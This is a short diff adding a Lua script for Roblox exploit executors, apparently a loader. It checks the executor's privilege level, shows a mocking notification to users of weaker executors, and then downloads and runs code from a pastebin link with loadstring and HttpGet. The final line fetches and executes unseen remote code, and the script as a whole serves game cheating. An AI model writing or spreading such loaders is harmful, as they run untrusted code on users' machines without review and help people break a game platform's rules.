@@ -1,0 +1,12 @@
+-- Who's a good little skid :3
+
+if getthreadidentity() < 4 then
+    return game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = identifyexecutor();
+        Text = "Sorry, But your executor (level " .. getthreadidentity() .. ") cannot run this, it's too weak!";
+        Duration = 15;
+        Button1 = "I will upgrade my executor";
+    })
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/NbZQ5Xmk"))()
